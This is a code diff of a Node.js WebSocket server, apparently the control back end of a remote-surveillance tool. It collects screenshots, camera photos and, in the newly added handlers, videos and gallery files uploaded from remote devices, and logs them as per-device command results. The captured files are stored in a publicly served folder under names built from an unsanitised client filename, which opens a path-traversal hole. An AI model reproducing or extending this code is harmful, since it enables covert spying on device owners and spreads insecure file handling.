@@ -11,7 +11,7 @@ const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
 app.use(cors());
-app.use(bodyParser.json({ limit: '50mb' }));
+app.use(bodyParser.json({ limit: '100mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 app.use('/screenshots', express.static(path.join(__dirname, 'public/screenshots')));
 
@@ -118,7 +118,6 @@ wss.on('connection', (ws, req) => {
                 return;
             }
 
-            // Скриншот
             if (data.type === 'screenshot') {
                 if (deviceCode && data.image) {
                     const timestamp = Date.now();
@@ -146,13 +145,11 @@ wss.on('connection', (ws, req) => {
                 return;
             }
 
-            // Фото с камеры
             if (data.type === 'camera_photo') {
                 if (deviceCode && data.image) {
                     const timestamp = Date.now();
-                    let ext = 'jpg';
                     let base64Data = data.image.replace(/^data:image\/jpeg;base64,/, '');
-                    const filename = `camera_${deviceCode}_${timestamp}.${ext}`;
+                    const filename = `camera_${deviceCode}_${timestamp}.jpg`;
                     const filepath = path.join(__dirname, 'public/screenshots', filename);
                     fs.writeFile(filepath, base64Data, 'base64', (err) => {
                         if (err) console.error('❌ Ошибка записи фото:', err);
@@ -160,6 +157,40 @@ wss.on('connection', (ws, req) => {
                     });
                     commandsHistory[deviceCode].push({ command: 'camera', time: timestamp, result: `/screenshots/${filename}` });
                     ws.send(JSON.stringify({ type: 'ack', command: 'camera', status: 'ok' }));
+                    broadcastDevices();
+                }
+                return;
+            }
+
+            if (data.type === 'video_file') {
+                if (deviceCode && data.filename && data.data) {
+                    const timestamp = Date.now();
+                    const filename = `video_${deviceCode}_${timestamp}_${data.filename}`;
+                    const filepath = path.join(__dirname, 'public/screenshots', filename);
+                    const buffer = Buffer.from(data.data, 'base64');
+                    fs.writeFile(filepath, buffer, (err) => {
+                        if (err) console.error('❌ Ошибка записи видео:', err);
+                        else console.log(`📹 Видео сохранено: ${filename}`);
+                    });
+                    commandsHistory[deviceCode].push({ command: 'video', time: timestamp, result: `/screenshots/${filename}` });
+                    ws.send(JSON.stringify({ type: 'ack', command: 'video', status: 'ok' }));
+                    broadcastDevices();
+                }
+                return;
+            }
+
+            if (data.type === 'gallery_item') {
+                if (deviceCode && data.filename && data.data) {
+                    const timestamp = Date.now();
+                    const filename = `gallery_${deviceCode}_${timestamp}_${data.filename}`;
+                    const filepath = path.join(__dirname, 'public/screenshots', filename);
+                    const buffer = Buffer.from(data.data, 'base64');
+                    fs.writeFile(filepath, buffer, (err) => {
+                        if (err) console.error('❌ Ошибка записи галереи:', err);
+                        else console.log(`🖼️ Файл галереи сохранён: ${filename}`);
+                    });
+                    commandsHistory[deviceCode].push({ command: 'gallery', time: timestamp, result: `/screenshots/${filename}` });
+                    ws.send(JSON.stringify({ type: 'ack', command: 'gallery', status: 'ok' }));
                     broadcastDevices();
                 }
                 return;
